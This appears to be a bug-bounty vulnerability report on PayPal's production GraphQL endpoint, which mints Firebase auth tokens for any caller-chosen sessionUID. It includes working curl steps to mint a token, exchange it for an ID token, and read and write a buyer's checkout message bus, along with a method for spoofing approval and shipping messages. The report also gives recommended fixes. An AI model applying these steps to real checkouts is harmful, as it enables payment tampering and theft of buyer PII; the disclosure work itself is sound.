# Pffffummm
Paypal's Firebase Unauth Mint Messagebus. Pffff, ummmmmmmmmmm.

This vulnerability demonstrates Improper Authentication in PayPal's `/graphql` `firebase.auth`, allowing an unauthenticated attacker to read and write any buyer's production checkout message bus (payerID, paymentID, billingToken, shipping PII)

## Summary

PayPal's production GraphQL endpoint at `https://www.paypal.com/graphql` mints a Firebase custom authentication token for any caller-supplied `sessionUID`, with no authentication and no rate limiting. PayPal's Firebase Admin SDK service account signs the token, and the mint sets the Firebase `uid` to a value the caller chooses. The Realtime Database rule protecting the native-checkout message bus is `auth.uid == $sessionUID`. Because `auth.uid` is caller-controlled, anyone holding a buyer's `sessionUID` gains full read and write access to that buyer's `users/{sessionUID}/messages` path. That path is the channel driving the native checkout `onApprove`, `onCancel`, and `onShippingChange` callbacks on the buyer's Smart Button. I reproduced the mint, the Identity Toolkit exchange, and a Realtime Database write and read end-to-end as an unauthenticated caller on `2026-07-18` and again on `2026-07-19`. The defect is the unauthenticated mint and the rule. The way an attacker obtains a `sessionUID` is a separate concern, addressed under Impact.

## Vulnerability Details

**Vulnerability Type:** Improper Authentication (CWE-287) / Improper Authorization (CWE-863) / Use of a Predictable/Weak Authorization Identifier (CWE-340)

**CVSS 3.1 Score:** 7.5 High, vector `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` (severity set automatically to full 10.0 Critical by H1 calculator)

**Affected Endpoint:** `POST https://www.paypal.com/graphql?GetFireBaseSessionToken`, GraphQL query `firebase.auth(sessionUID)`

**Downstream:** `POST https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken` (public web API key `AIzaSyCjAXE6JoC5e...`, embedded in PayPal's Smart Button JS); `https://api-project-[redacted].firebaseio.com` (PayPal's production Realtime Database)

**Attacker role:** unauthenticated (no cookies, no bearer token, no PayPal account)

**Reproduced:** `2026-07-18`, re-verified `2026-07-19` (originally found `2026-06-01` but got stumped and only managed to prove the vulnerability on `2026-07-18`)

## Steps to Reproduce

All requests are unauthenticated.

**1. Mint a Firebase custom token for an arbitrary uid.**

```bash
curl -s -X POST "https://www.paypal.com/graphql?GetFireBaseSessionToken" \
  -H "Content-Type: application/json" \
  -H "x-app-name: smart-payment-buttons" \
  -d '{"query":"query G($s:String!){firebase{auth(sessionUID:$s){sessionToken}}}","variables":{"s":"ATTACKER_CHOSEN_UID"}}'
```

Response (2026-07-19): an RS256 JWT signed by `firebase-adminsdk-9vksp@api-project-[redacted].iam.gserviceaccount.com`. The decoded payload sets `aud` to Identity Toolkit, `exp` to `iat + 3600`, and the Firebase `uid` to `ATTACKER_CHOSEN_UID` (the caller-supplied value, applied server-side).

**2. Exchange the custom token for a Firebase ID token.** The web API key is public, embedded in PayPal's Smart Button JS at `https://www.paypal.com/smart/button?client-id=sb`.

```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=AIzaSyCjAXE6JoC5e..." \
  -H "Content-Type: application/json" \
  -d '{"token":"<CUSTOM_TOKEN>","returnSecureToken":true}'
```

Response (2026-07-19): `idToken` (long RSA JWT), `refreshToken`, and `isNewUser: true`. Identity Toolkit creates a user record in PayPal's Firebase project for each new uid.

**3. Write to and read the session message bus.**

```bash
# write
curl -s -X PUT "https://api-project-[redacted].firebaseio.com/users/ATTACKER_CHOSEN_UID/messages/msg1.json?auth=<ID_TOKEN>" \
  -d '{"injected":"poc_message","from":"attacker","session_uid":"ATTACKER_CONTROLS_THIS"}'
# read
curl -s "https://api-project-[redacted].firebaseio.com/users/ATTACKER_CHOSEN_UID/messages.json?auth=<ID_TOKEN>"
```

Response (2026-07-19): write returned `{"from":"attacker","injected":"poc_message","session_uid":"ATTACKER_CONTROLS_THIS"}` (HTTP 200); read returned the same object (HTTP 200); DELETE cleanup returned HTTP 200. I used an attacker-chosen uid and cleaned up after. A control read of top-level `/users.json` returned HTTP 401 `Permission denied`, so the database rules hold for paths the caller did not mint.

The complete reproducible script is in `the-stuff/poc.sh`; the redacted full request and response transcript is in `the-stuff/evidence.txt`.

## Impact

`users/{sessionUID}/messages` is the Firebase bus between the web Smart Button and the native checkout app (`@paypal/smart-payment-buttons` `api/socket.js`, `payment-flows/native/socket.js`). The button registers listeners for `onInit`, `onApprove`, `onCancel`, `onShippingChange`, `onError`, `onFallback`. `onApprove` carries `{payerID, paymentID, billingToken}`. Incoming messages are dispatched by `message_name`, and the only guard is `requireSessionUID`:

```js
// api/socket.js (messageSocket)
const { handler, requireSessionUID } = requestListener;
if (requireSessionUID && messageSessionUID !== sessionUID) {
  throw new Error(`Incorrect sessionUID: ${messageSessionUID || "undefined"}`);
}
```

The writer controls the message's `session_uid` field. An attacker with write access to a victim's path sets `session_uid` to the victim's UID, the guard passes, and the victim's button fires `onApprove`, `onCancel`, or `onShippingChange` with attacker-controlled data: spoofed native-app responses injected into a live checkout (false approval, false cancellation, shipping-address manipulation), plus reading of session-coordination data carrying buyer PII. The unauthenticated, un-rate-limited credential mint also lets any caller create arbitrary users and consume PayPal's production Firebase project resources independent of any victim.

### The acquisition vector is not the vulnerability

A triager may read "needs the victim's `sessionUID`" and score this down to Medium or N/A on the basis that capturing the identifier requires phishing or physical proximity. That misreads the defect. Two separate things are in play, and only one is in PayPal's control.

1. **Identifier acquisition.** The attacker obtains a victim's `sessionUID` through phishing, social engineering, a shared device, a leaked URL, a Venmo QR scanned at close range, a referrer leak, or a logging or proxy capture. PayPal cannot fix phishing. No code change stops a buyer from opening a link or handing over a device.

2. **Data exposure.** Once the attacker holds the identifier, the damage follows because the mint trusts a caller-supplied `sessionUID` and the Realtime Database rule treats that same value as the authorisation. The mint runs unauthenticated. The `uid` is whatever the caller sends. The rule is `auth.uid == $sessionUID`. Three failure points sit in PayPal's code, all fixable.

Fix the mint, require an authenticated PayPal session before issuing the token and bind `uid` to the authenticated caller, or fix the rule and stop authorising message-bus access on `sessionUID` equality alone. A phished `sessionUID` then buys the attacker nothing. The buyer's checkout message bus, which carries `payerID`, `paymentID`, `billingToken`, shipping address, and session-coordination data, stops leaking. The PII theft is preventable at this layer regardless of how the identifier was obtained. The stolen identifier is dangerous only because the defect lets it authorise message-bus access; remove the defect and the identifier, stolen or not, authorises nothing.

### Why the identifier is exposed in the first place

The `sessionUID` is generated client-side with a non-cryptographic PRNG:

```js
// @krakenjs/belter util.js
function uniqueID() {
  var chars = "0123456789abcdef";
  return "uid_" + "xxxxxxxxxx".replace(/./g, () =>
    chars.charAt(Math.floor(Math.random() * chars.length))
  ) + "_" + base64encode((new Date).toISOString().slice(11,19).replace("T","."));
}
```

Ten hex digits from `Math.random()` plus a base64 of the wall-clock time `HH:MM:SS`. The uid travels as a URL query parameter in the native-checkout deep link:

```
https://www.paypal.com/smart/checkout/native?sessionUID=uid_xxxxxxxxxx_...&orderID=...&facilitatorAccessToken=...
```

and is encoded in Venmo QR codes (`payment-flows/native/qrcode.js`). It appears in browser history, referrers, shared-device URLs, QR proximity capture, and any logging or proxy that records the native deep link.

## Recommended Fix

Require an authenticated PayPal session on the `firebase.auth` resolver before minting, bind the minted `uid` to the authenticated caller rather than echoing a parameter, and rate-limit the resolver. Generate `sessionUID` with a CSPRNG (`crypto.getRandomValues`) instead of `Math.random()` plus timestamp, and stop transmitting `sessionUID` and `facilitatorAccessToken` as cleartext URL query parameters.

## Supporting Materials

- `the-stuff/evidence.txt`: `2026-07-19` end-to-end capture (mint, exchange, write, read, cleanup, `/users` 401 control) - came from first version
- `the-stuff/poc.sh`: reproducible unauthenticated PoC script

## Notes / scope

All testing used attacker-chosen UIDs and my own writes, cleaned up. No other user's data was accessed. Firebase resources identified: project `api-project-[redacted]`; public web API key `AIzaSyCjAXE6JoC5e...` (in PayPal JS); Realtime Database `api-project-[redacted].firebaseio.com`; Admin service account `firebase-adminsdk-9vksp@api-project-[redacted].iam.gserviceaccount.com`.

## Redacteds

All of the following have been redacted to protect PayPal's goopies even though I hate them:

- Google API key
- Firebase Project ID 